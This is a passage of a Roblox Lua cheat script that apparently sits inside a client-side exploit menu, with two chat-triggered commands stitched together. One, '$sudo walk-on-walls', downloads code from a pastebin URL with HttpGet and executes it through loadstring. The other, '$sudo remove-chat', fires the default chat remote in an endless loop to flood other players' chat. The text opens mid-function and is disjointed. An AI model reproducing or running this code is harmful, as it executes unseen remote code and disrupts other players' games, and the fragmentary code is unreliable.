    if msg == "$sudo walk-on-walls" then
    loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
    end
end
Players.LocalPlayer.Chatted:Connect(chatted)


local Players = game:GetService("Players")

local function chatted(msg)
    if msg == "$sudo remove-chat" then
    
-- FE chat made by MrBeast#5353
-- The effect isn't immediate, it they may take a few minutes.
-- This is a beta version, it only works in games that use the default roblox chat
while true do
    wait(1.7)
local args = {
    [1] = "‚Åü",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end
    end
end
Players.LocalPlayer.Chatted:Connect(chatted)
